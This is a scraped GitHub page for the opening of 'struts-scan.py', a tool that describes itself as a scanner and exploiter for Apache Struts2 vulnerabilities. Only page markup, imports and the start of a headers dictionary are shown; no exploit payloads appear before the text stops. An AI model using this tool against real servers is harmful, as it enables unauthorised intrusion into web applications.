





<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://assets-cdn.github.com">
  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <link crossorigin="anonymous" href="https://assets-cdn.github.com/assets/frameworks-d7137690e30123bade38abb082ac79f36cc7a105ff92e602405f53b725465cab.css" integrity="sha256-1xN2kOMBI7reOKuwgqx582zHoQX/kuYCQF9TtyVGXKs=" media="all" rel="stylesheet" />
  <link crossorigin="anonymous" href="https://assets-cdn.github.com/assets/github-b0fb841796ba96001dc0b69d913512b6eac083b4dbe09f0522e0a0871ad5d7bc.css" integrity="sha256-sPuEF5a6lgAdwLadkTUSturAg7Tb4J8FIuCghxrV17w=" media="all" rel="stylesheet" />
  
  
  <link crossorigin="anonymous" href="https://assets-cdn.github.com/assets/site-9badff1160428596c4d3259460ba1fb73c4f2997ee2a0767ba28e6c1720d5553.css" integrity="sha256-m63/EWBChZbE0yWUYLoftzxPKZfuKgdnuijmwXINVVM=" media="all" rel="stylesheet" />
  

  <meta name="viewport" content="width=device-width">
  
  <title>struts-scan/struts-scan.py at master · Lucifer1993/struts-scan · GitHub</title>
  <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">

    
    <meta content="https://avatars3.githubusercontent.com/u/11784451?v=4&amp;s=400" property="og:image" /><meta content="GitHub" property="og:site_name" /><meta content="object" property="og:type" /><meta content="Lucifer1993/struts-scan" property="og:title" /><meta content="https://github.com/Lucifer1993/struts-scan" property="og:url" /><meta content="struts-scan - struts2漏洞全版本检测和利用工具" property="og:description" />

  <link rel="assets" href="https://assets-cdn.github.com/">
  
  <meta name="pjax-timeout" content="1000">
  
  <meta name="request-id" content="2FC6:1637:156AB356:200A15FD:59DE5500" data-pjax-transient>
  

  <meta name="selected-link" value="repo_source" data-pjax-transient>

  <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
<meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
    <meta name="google-analytics" content="UA-3769691-2">

<meta content="collector.githubapp.com" name="octolytics-host" /><meta content="github" name="octolytics-app-id" /><meta content="https://collector.githubapp.com/github-external/browser_event" name="octolytics-event-url" /><meta content="2FC6:1637:156AB356:200A15FD:59DE5500" name="octolytics-dimension-request_id" /><meta content="sea" name="octolytics-dimension-region_edge" /><meta content="iad" name="octolytics-dimension-region_render" />
<meta content="/&lt;user-name&gt;/&lt;repo-name&gt;/blob/show" data-pjax-transient="true" name="analytics-location" />




  <meta class="js-ga-set" name="dimension1" content="Logged Out">


  

      <meta name="hostname" content="github.com">
  <meta name="user-login" content="">

      <meta name="expected-hostname" content="github.com">
    <meta name="js-proxy-site-detection-payload" content="ZGMxOTRlN2U5Nzg0NTQ4NzE4OWNiYmEzNGQ3YWY0NjEzODIyYzRjOTQxOWQ0MmZjMmY5YTYyOGNlOWExNTE1Y3x7InJlbW90ZV9hZGRyZXNzIjoiMTExLjE5OS4xODkuNDEiLCJyZXF1ZXN0X2lkIjoiMkZDNjoxNjM3OjE1NkFCMzU2OjIwMEExNUZEOjU5REU1NTAwIiwidGltZXN0YW1wIjoxNTA3NzQyOTc3LCJob3N0IjoiZ2l0aHViLmNvbSJ9">


  <meta name="html-safe-nonce" content="93e9e86e09a355f27d34d4cc42bce8e5b817aa48">

  <meta http-equiv="x-pjax-version" content="75be586ec51ac7483a13d574ad3f5724">
  

      <link href="https://github.com/Lucifer1993/struts-scan/commits/master.atom" rel="alternate" title="Recent Commits to struts-scan:master" type="application/atom+xml">

  <meta name="description" content="struts-scan - struts2漏洞全版本检测和利用工具">
  <meta name="go-import" content="github.com/Lucifer1993/struts-scan git https://github.com/Lucifer1993/struts-scan.git">

  <meta content="11784451" name="octolytics-dimension-user_id" /><meta content="Lucifer1993" name="octolytics-dimension-user_login" /><meta content="72543167" name="octolytics-dimension-repository_id" /><meta content="Lucifer1993/struts-scan" name="octolytics-dimension-repository_nwo" /><meta content="true" name="octolytics-dimension-repository_public" /><meta content="false" name="octolytics-dimension-repository_is_fork" /><meta content="72543167" name="octolytics-dimension-repository_network_root_id" /><meta content="Lucifer1993/struts-scan" name="octolytics-dimension-repository_network_root_nwo" /><meta content="false" name="octolytics-dimension-repository_explore_github_marketplace_ci_cta_shown" />


    <link rel="canonical" href="https://github.com/Lucifer1993/struts-scan/blob/master/struts-scan.py" data-pjax-transient>


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://assets-cdn.github.com/pinned-octocat.svg" color="#000000">
  <link rel="icon" type="image/x-icon" href="https://assets-cdn.github.com/favicon.ico">

<meta name="theme-color" content="#1e2327">


  <meta name="u2f-support" content="true">

  </head>

  <body class="logged-out env-production page-blob">
    

  <div class="position-relative js-header-wrapper ">
    <a href="#start-of-content" tabindex="1" class="px-2 py-4 show-on-focus js-skip-to-content">Skip to content</a>
    <div id="js-pjax-loader-bar" class="pjax-loader-bar"><div class="progress"></div></div>

    
    
    <div class="unsupported-browser">
  <div class="container clearfix">
    <!-- '"` --><!-- </textarea></xmp> --></option></form><form accept-charset="UTF-8" action="/site/dismiss_unsupported_browser" method="post"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /><input name="authenticity_token" type="hidden" value="3V96X++PTl0QzpaqkU93iiV4bNzc50tCD9nRcvmm0DVYkfBDEPP1yJC/IvyS58cdyrLUr/8huI6hhVQTLQLWyA==" /></div>
      <button type="submit" class="btn btn-danger">Ignore</button>
</form>    <a href="https://help.github.com/articles/supported-browsers" class="btn">Learn more</a>

      <h5>Please note that GitHub no longer supports your web browser.</h5>
      <p>We recommend upgrading to the latest <a href="https://chrome.google.com">Google Chrome</a> or <a href="https://mozilla.org/firefox/">Firefox</a>.</p>
  </div>
</div>




        <header class="Header header-logged-out  position-relative f4 py-3" role="banner">
  <div class="container-lg d-flex px-3">
    <div class="d-flex flex-justify-between flex-items-center">
      <a class="header-logo-invertocat my-0" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
        <svg aria-hidden="true" class="octicon octicon-mark-github" height="32" version="1.1" viewBox="0 0 16 16" width="32"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>
      </a>

    </div>

    <div class="HeaderMenu HeaderMenu--bright d-flex flex-justify-between flex-auto">
        <nav class="mt-0">
          <ul class="d-flex list-style-none">
              <li class="ml-2">
                <a href="/features" class="js-selected-navigation-item HeaderNavlink px-0 py-2 m-0" data-ga-click="Header, click, Nav menu - item:features" data-selected-links="/features /features/project-management /features/code-review /features/project-management /features/integrations /features">
                  Features
</a>              </li>
              <li class="ml-4">
                <a href="/business" class="js-selected-navigation-item HeaderNavlink px-0 py-2 m-0" data-ga-click="Header, click, Nav menu - item:business" data-selected-links="/business /business/security /business/customers /business">
                  Business
</a>              </li>

              <li class="ml-4">
                <a href="/explore" class="js-selected-navigation-item HeaderNavlink px-0 py-2 m-0" data-ga-click="Header, click, Nav menu - item:explore" data-selected-links="/explore /trending /trending/developers /integrations /integrations/feature/code /integrations/feature/collaborate /integrations/feature/ship showcases showcases_search showcases_landing /explore">
                  Explore
</a>              </li>

              <li class="ml-4">
                    <a href="/marketplace" class="js-selected-navigation-item HeaderNavlink px-0 py-2 m-0" data-ga-click="Header, click, Nav menu - item:marketplace" data-selected-links=" /marketplace">
                      Marketplace
</a>              </li>
              <li class="ml-4">
                <a href="/pricing" class="js-selected-navigation-item HeaderNavlink px-0 py-2 m-0" data-ga-click="Header, click, Nav menu - item:pricing" data-selected-links="/pricing /pricing/developer /pricing/team /pricing/business-hosted /pricing/business-enterprise /pricing">
                  Pricing
</a>              </li>
          </ul>
        </nav>

      <div class="d-flex">
          <div class="d-lg-flex flex-items-center mr-3">
            <div class="header-search scoped-search site-scoped-search js-site-search" role="search">
  <!-- '"` --><!-- </textarea></xmp> --></option></form><form accept-charset="UTF-8" action="/Lucifer1993/struts-scan/search" class="js-site-search-form" data-scoped-search-url="/Lucifer1993/struts-scan/search" data-unscoped-search-url="/search" method="get"><div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /></div>
    <label class="form-control header-search-wrapper js-chromeless-input-container">
        <a href="/Lucifer1993/struts-scan/blob/master/struts-scan.py" class="header-search-scope no-underline">This repository</a>
      <input type="text"
        class="form-control header-search-input js-site-search-focus js-site-search-field is-clearable"
        data-hotkey="s"
        name="q"
        value=""
        placeholder="Search"
        aria-label="Search this repository"
        data-unscoped-placeholder="Search GitHub"
        data-scoped-placeholder="Search"
        autocapitalize="off">
        <input type="hidden" class="js-site-search-type-field" name="type" >
    </label>
</form></div>

          </div>

        <span class="d-inline-block">
            <div class="HeaderNavlink px-0 py-2 m-0">
              <a class="text-bold text-white no-underline" href="/login?return_to=%2FLucifer1993%2Fstruts-scan%2Fblob%2Fmaster%2Fstruts-scan.py" data-ga-click="(Logged out) Header, clicked Sign in, text:sign-in">Sign in</a>
                <span class="text-gray">or</span>
                <a class="text-bold text-white no-underline" href="/join?source=header-repo" data-ga-click="(Logged out) Header, clicked Sign up, text:sign-up">Sign up</a>
            </div>
        </span>
      </div>
    </div>
  </div>
</header>


  </div>

  <div id="start-of-content" class="show-on-focus"></div>

    <div id="js-flash-container">
</div>



  <div role="main">
        <div itemscope itemtype="http://schema.org/SoftwareSourceCode">
    <div id="js-repo-pjax-container" data-pjax-container>
      





    <div class="pagehead repohead instapaper_ignore readability-menu experiment-repo-nav ">
      <div class="repohead-details-container clearfix container ">

        <ul class="pagehead-actions">
  <li>
      <a href="/login?return_to=%2FLucifer1993%2Fstruts-scan"
    class="btn btn-sm btn-with-count tooltipped tooltipped-n"
    aria-label="You must be signed in to watch a repository" rel="nofollow">
    <svg aria-hidden="true" class="octicon octicon-eye" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M8.06 2C3 2 0 8 0 8s3 6 8.06 6C13 14 16 8 16 8s-3-6-7.94-6zM8 12c-2.2 0-4-1.78-4-4 0-2.2 1.8-4 4-4 2.22 0 4 1.8 4 4 0 2.22-1.78 4-4 4zm2-4c0 1.11-.89 2-2 2-1.11 0-2-.89-2-2 0-1.11.89-2 2-2 1.11 0 2 .89 2 2z"/></svg>
    Watch
  </a>
  <a class="social-count" href="/Lucifer1993/struts-scan/watchers"
     aria-label="13 users are watching this repository">
    13
  </a>

  </li>

  <li>
      <a href="/login?return_to=%2FLucifer1993%2Fstruts-scan"
    class="btn btn-sm btn-with-count tooltipped tooltipped-n"
    aria-label="You must be signed in to star a repository" rel="nofollow">
    <svg aria-hidden="true" class="octicon octicon-star" height="16" version="1.1" viewBox="0 0 14 16" width="14"><path fill-rule="evenodd" d="M14 6l-4.9-.64L7 1 4.9 5.36 0 6l3.6 3.26L2.67 14 7 11.67 11.33 14l-.93-4.74z"/></svg>
    Star
  </a>

    <a class="social-count js-social-count" href="/Lucifer1993/struts-scan/stargazers"
      aria-label="115 users starred this repository">
      115
    </a>

  </li>

  <li>
      <a href="/login?return_to=%2FLucifer1993%2Fstruts-scan"
        class="btn btn-sm btn-with-count tooltipped tooltipped-n"
        aria-label="You must be signed in to fork a repository" rel="nofollow">
        <svg aria-hidden="true" class="octicon octicon-repo-forked" height="16" version="1.1" viewBox="0 0 10 16" width="10"><path fill-rule="evenodd" d="M8 1a1.993 1.993 0 0 0-1 3.72V6L5 8 3 6V4.72A1.993 1.993 0 0 0 2 1a1.993 1.993 0 0 0-1 3.72V6.5l3 3v1.78A1.993 1.993 0 0 0 5 15a1.993 1.993 0 0 0 1-3.72V9.5l3-3V4.72A1.993 1.993 0 0 0 8 1zM2 4.2C1.34 4.2.8 3.65.8 3c0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3 10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3-10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2z"/></svg>
        Fork
      </a>

    <a href="/Lucifer1993/struts-scan/network" class="social-count"
       aria-label="56 users forked this repository">
      56
    </a>
  </li>
</ul>

        <h1 class="public ">
  <svg aria-hidden="true" class="octicon octicon-repo" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M4 9H3V8h1v1zm0-3H3v1h1V6zm0-2H3v1h1V4zm0-2H3v1h1V2zm8-1v12c0 .55-.45 1-1 1H6v2l-1.5-1.5L3 16v-2H1c-.55 0-1-.45-1-1V1c0-.55.45-1 1-1h10c.55 0 1 .45 1 1zm-1 10H1v2h2v-1h3v1h5v-2zm0-10H2v9h9V1z"/></svg>
  <span class="author" itemprop="author"><a href="/Lucifer1993" class="url fn" rel="author">Lucifer1993</a></span><!--
--><span class="path-divider">/</span><!--
--><strong itemprop="name"><a href="/Lucifer1993/struts-scan" data-pjax="#js-repo-pjax-container">struts-scan</a></strong>

</h1>

      </div>
      
<nav class="reponav js-repo-nav js-sidenav-container-pjax container"
     itemscope
     itemtype="http://schema.org/BreadcrumbList"
     role="navigation"
     data-pjax="#js-repo-pjax-container">

  <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
    <a href="/Lucifer1993/struts-scan" class="js-selected-navigation-item selected reponav-item" data-hotkey="g c" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches /Lucifer1993/struts-scan" itemprop="url">
      <svg aria-hidden="true" class="octicon octicon-code" height="16" version="1.1" viewBox="0 0 14 16" width="14"><path fill-rule="evenodd" d="M9.5 3L8 4.5 11.5 8 8 11.5 9.5 13 14 8 9.5 3zm-5 0L0 8l4.5 5L6 11.5 2.5 8 6 4.5 4.5 3z"/></svg>
      <span itemprop="name">Code</span>
      <meta itemprop="position" content="1">
</a>  </span>

    <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
      <a href="/Lucifer1993/struts-scan/issues" class="js-selected-navigation-item reponav-item" data-hotkey="g i" data-selected-links="repo_issues repo_labels repo_milestones /Lucifer1993/struts-scan/issues" itemprop="url">
        <svg aria-hidden="true" class="octicon octicon-issue-opened" height="16" version="1.1" viewBox="0 0 14 16" width="14"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"/></svg>
        <span itemprop="name">Issues</span>
        <span class="Counter">2</span>
        <meta itemprop="position" content="2">
</a>    </span>

  <span itemscope itemtype="http://schema.org/ListItem" itemprop="itemListElement">
    <a href="/Lucifer1993/struts-scan/pulls" class="js-selected-navigation-item reponav-item" data-hotkey="g p" data-selected-links="repo_pulls /Lucifer1993/struts-scan/pulls" itemprop="url">
      <svg aria-hidden="true" class="octicon octicon-git-pull-request" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M11 11.28V5c-.03-.78-.34-1.47-.94-2.06C9.46 2.35 8.78 2.03 8 2H7V0L4 3l3 3V4h1c.27.02.48.11.69.31.21.2.3.42.31.69v6.28A1.993 1.993 0 0 0 10 15a1.993 1.993 0 0 0 1-3.72zm-1 2.92c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zM4 3c0-1.11-.89-2-2-2a1.993 1.993 0 0 0-1 3.72v6.56A1.993 1.993 0 0 0 2 15a1.993 1.993 0 0 0 1-3.72V4.72c.59-.34 1-.98 1-1.72zm-.8 10c0 .66-.55 1.2-1.2 1.2-.65 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2zM2 4.2C1.34 4.2.8 3.65.8 3c0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2z"/></svg>
      <span itemprop="name">Pull requests</span>
      <span class="Counter">0</span>
      <meta itemprop="position" content="3">
</a>  </span>

    <a href="/Lucifer1993/struts-scan/projects" class="js-selected-navigation-item reponav-item" data-hotkey="g b" data-selected-links="repo_projects new_repo_project repo_project /Lucifer1993/struts-scan/projects">
      <svg aria-hidden="true" class="octicon octicon-project" height="16" version="1.1" viewBox="0 0 15 16" width="15"><path fill-rule="evenodd" d="M10 12h3V2h-3v10zm-4-2h3V2H6v8zm-4 4h3V2H2v12zm-1 1h13V1H1v14zM14 0H1a1 1 0 0 0-1 1v14a1 1 0 0 0 1 1h13a1 1 0 0 0 1-1V1a1 1 0 0 0-1-1z"/></svg>
      Projects
      <span class="Counter" >0</span>
</a>


  <a href="/Lucifer1993/struts-scan/pulse" class="js-selected-navigation-item reponav-item" data-selected-links="repo_graphs repo_contributors dependency_graph pulse /Lucifer1993/struts-scan/pulse">
    <svg aria-hidden="true" class="octicon octicon-graph" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M16 14v1H0V0h1v14h15zM5 13H3V8h2v5zm4 0H7V3h2v10zm4 0h-2V6h2v7z"/></svg>
    Insights
</a>

</nav>


    </div>

<div class="container new-discussion-timeline experiment-repo-nav">
  <div class="repository-content">

    
  <a href="/Lucifer1993/struts-scan/blob/488fedfc6ade8fc3d54361a317c8379e8dffcacd/struts-scan.py" class="d-none js-permalink-shortcut" data-hotkey="y">Permalink</a>

  <!-- blob contrib key: blob_contributors:v21:4d6f9e6da1966f2c3e3e5fd65e9d0053 -->

  <div class="file-navigation js-zeroclipboard-container">
    
<div class="select-menu branch-select-menu js-menu-container js-select-menu float-left">
  <button class=" btn btn-sm select-menu-button js-menu-target css-truncate" data-hotkey="w"
    
    type="button" aria-label="Switch branches or tags" aria-expanded="false" aria-haspopup="true">
      <i>Branch:</i>
      <span class="js-select-button css-truncate-target">master</span>
  </button>

  <div class="select-menu-modal-holder js-menu-content js-navigation-container" data-pjax>

    <div class="select-menu-modal">
      <div class="select-menu-header">
        <svg aria-label="Close" class="octicon octicon-x js-menu-close" height="16" role="img" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48z"/></svg>
        <span class="select-menu-title">Switch branches/tags</span>
      </div>

      <div class="select-menu-filters">
        <div class="select-menu-text-filter">
          <input type="text" aria-label="Filter branches/tags" id="context-commitish-filter-field" class="form-control js-filterable-field js-navigation-enable" placeholder="Filter branches/tags">
        </div>
        <div class="select-menu-tabs">
          <ul>
            <li class="select-menu-tab">
              <a href="#" data-tab-filter="branches" data-filter-placeholder="Filter branches/tags" class="js-select-menu-tab" role="tab">Branches</a>
            </li>
            <li class="select-menu-tab">
              <a href="#" data-tab-filter="tags" data-filter-placeholder="Find a tag…" class="js-select-menu-tab" role="tab">Tags</a>
            </li>
          </ul>
        </div>
      </div>

      <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket" data-tab-filter="branches" role="menu">

        <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">


            <a class="select-menu-item js-navigation-item js-navigation-open selected"
               href="/Lucifer1993/struts-scan/blob/master/struts-scan.py"
               data-name="master"
               data-skip-pjax="true"
               rel="nofollow">
              <svg aria-hidden="true" class="octicon octicon-check select-menu-item-icon" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5z"/></svg>
              <span class="select-menu-item-text css-truncate-target js-select-menu-filter-text">
                master
              </span>
            </a>
        </div>

          <div class="select-menu-no-results">Nothing to show</div>
      </div>

      <div class="select-menu-list select-menu-tab-bucket js-select-menu-tab-bucket" data-tab-filter="tags">
        <div data-filterable-for="context-commitish-filter-field" data-filterable-type="substring">


        </div>

        <div class="select-menu-no-results">Nothing to show</div>
      </div>

    </div>
  </div>
</div>

    <div class="BtnGroup float-right">
      <a href="/Lucifer1993/struts-scan/find/master"
            class="js-pjax-capture-input btn btn-sm BtnGroup-item"
            data-pjax
            data-hotkey="t">
        Find file
      </a>
      <button aria-label="Copy file path to clipboard" class="js-zeroclipboard btn btn-sm BtnGroup-item tooltipped tooltipped-s" data-copied-hint="Copied!" type="button">Copy path</button>
    </div>
    <div class="breadcrumb js-zeroclipboard-target">
      <span class="repo-root js-repo-root"><span class="js-path-segment"><a href="/Lucifer1993/struts-scan"><span>struts-scan</span></a></span></span><span class="separator">/</span><strong class="final-path">struts-scan.py</strong>
    </div>
  </div>


  
  <div class="commit-tease">
      <span class="float-right">
        <a class="commit-tease-sha" href="/Lucifer1993/struts-scan/commit/aee24c8d609125542ed5fa2d535c2593df55ba68" data-pjax>
          aee24c8
        </a>
        <relative-time datetime="2017-10-11T16:20:29Z">Oct 11, 2017</relative-time>
      </span>
      <div>
        <img alt="@Lucifer1993" class="avatar" height="20" src="https://avatars1.githubusercontent.com/u/11784451?v=4&amp;s=40" width="20" />
        <a href="/Lucifer1993" class="user-mention" rel="author">Lucifer1993</a>
          <a href="/Lucifer1993/struts-scan/commit/aee24c8d609125542ed5fa2d535c2593df55ba68" class="message" data-pjax="true" title="add poc s2-052">add poc s2-052</a>
      </div>

    <div class="commit-tease-contributors">
      <button type="button" class="btn-link muted-link contributors-toggle" data-facebox="#blob_contributors_box">
        <strong>1</strong>
         contributor
      </button>
      
    </div>

    <div id="blob_contributors_box" style="display:none">
      <h2 class="facebox-header" data-facebox-id="facebox-header">Users who have contributed to this file</h2>
      <ul class="facebox-user-list" data-facebox-id="facebox-description">
          <li class="facebox-user-list-item">
            <img alt="@Lucifer1993" height="24" src="https://avatars3.githubusercontent.com/u/11784451?v=4&amp;s=48" width="24" />
            <a href="/Lucifer1993">Lucifer1993</a>
          </li>
      </ul>
    </div>
  </div>


  <div class="file">
    <div class="file-header">
  <div class="file-actions">

    <div class="BtnGroup">
      <a href="/Lucifer1993/struts-scan/raw/master/struts-scan.py" class="btn btn-sm BtnGroup-item" id="raw-url">Raw</a>
        <a href="/Lucifer1993/struts-scan/blame/master/struts-scan.py" class="btn btn-sm js-update-url-with-hash BtnGroup-item" data-hotkey="b">Blame</a>
      <a href="/Lucifer1993/struts-scan/commits/master/struts-scan.py" class="btn btn-sm BtnGroup-item" rel="nofollow">History</a>
    </div>

        <a class="btn-octicon tooltipped tooltipped-nw"
           href="https://desktop.github.com"
           aria-label="Open this file in GitHub Desktop"
           data-ga-click="Repository, open with desktop, type:windows">
            <svg aria-hidden="true" class="octicon octicon-device-desktop" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M15 2H1c-.55 0-1 .45-1 1v9c0 .55.45 1 1 1h5.34c-.25.61-.86 1.39-2.34 2h8c-1.48-.61-2.09-1.39-2.34-2H15c.55 0 1-.45 1-1V3c0-.55-.45-1-1-1zm0 9H1V3h14v8z"/></svg>
        </a>

        <button type="button" class="btn-octicon disabled tooltipped tooltipped-nw"
          aria-label="You must be signed in to make or propose changes">
          <svg aria-hidden="true" class="octicon octicon-pencil" height="16" version="1.1" viewBox="0 0 14 16" width="14"><path fill-rule="evenodd" d="M0 12v3h3l8-8-3-3-8 8zm3 2H1v-2h1v1h1v1zm10.3-9.3L12 6 9 3l1.3-1.3a.996.996 0 0 1 1.41 0l1.59 1.59c.39.39.39 1.02 0 1.41z"/></svg>
        </button>
        <button type="button" class="btn-octicon btn-octicon-danger disabled tooltipped tooltipped-nw"
          aria-label="You must be signed in to make or propose changes">
          <svg aria-hidden="true" class="octicon octicon-trashcan" height="16" version="1.1" viewBox="0 0 12 16" width="12"><path fill-rule="evenodd" d="M11 2H9c0-.55-.45-1-1-1H5c-.55 0-1 .45-1 1H2c-.55 0-1 .45-1 1v1c0 .55.45 1 1 1v9c0 .55.45 1 1 1h7c.55 0 1-.45 1-1V5c.55 0 1-.45 1-1V3c0-.55-.45-1-1-1zm-1 12H3V5h1v8h1V5h1v8h1V5h1v8h1V5h1v9zm1-10H2V3h9v1z"/></svg>
        </button>
  </div>

  <div class="file-info">
      <span class="file-mode" title="File mode">executable file</span>
      <span class="file-info-divider"></span>
      384 lines (353 sloc)
      <span class="file-info-divider"></span>
    31.5 KB
  </div>
</div>

    

  <div itemprop="text" class="blob-wrapper data type-python">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tr>
        <td id="L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span>!/usr/bin/env python</span></td>
      </tr>
      <tr>
        <td id="L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> coding=utf-8</span></td>
      </tr>
      <tr>
        <td id="L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> code by Lucifer</span></td>
      </tr>
      <tr>
        <td id="L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Date 2017/10/12 </span></td>
      </tr>
      <tr>
        <td id="L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="LC5" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="LC6" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-k">import</span> sys</td>
      </tr>
      <tr>
        <td id="L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-k">import</span> base64</td>
      </tr>
      <tr>
        <td id="L9" class="blob-num js-line-number" data-line-number="9"></td>
        <td id="LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-k">import</span> warnings</td>
      </tr>
      <tr>
        <td id="L10" class="blob-num js-line-number" data-line-number="10"></td>
        <td id="LC10" class="blob-code blob-code-inner js-file-line"><span class="pl-k">import</span> requests</td>
      </tr>
      <tr>
        <td id="L11" class="blob-num js-line-number" data-line-number="11"></td>
        <td id="LC11" class="blob-code blob-code-inner js-file-line"><span class="pl-k">from</span> termcolor <span class="pl-k">import</span> cprint</td>
      </tr>
      <tr>
        <td id="L12" class="blob-num js-line-number" data-line-number="12"></td>
        <td id="LC12" class="blob-code blob-code-inner js-file-line">warnings.filterwarnings(<span class="pl-s"><span class="pl-pds">&quot;</span>ignore<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L13" class="blob-num js-line-number" data-line-number="13"></td>
        <td id="LC13" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">reload</span>(sys)</td>
      </tr>
      <tr>
        <td id="L14" class="blob-num js-line-number" data-line-number="14"></td>
        <td id="LC14" class="blob-code blob-code-inner js-file-line">sys.setdefaultencoding(<span class="pl-s"><span class="pl-pds">&#39;</span>utf-8<span class="pl-pds">&#39;</span></span>)</td>
      </tr>
      <tr>
        <td id="L15" class="blob-num js-line-number" data-line-number="15"></td>
        <td id="LC15" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L16" class="blob-num js-line-number" data-line-number="16"></td>
        <td id="LC16" class="blob-code blob-code-inner js-file-line">headers <span class="pl-k">=</span> {</td>
      </tr>
      <tr>
        <td id="L17" class="blob-num js-line-number" data-line-number="17"></td>
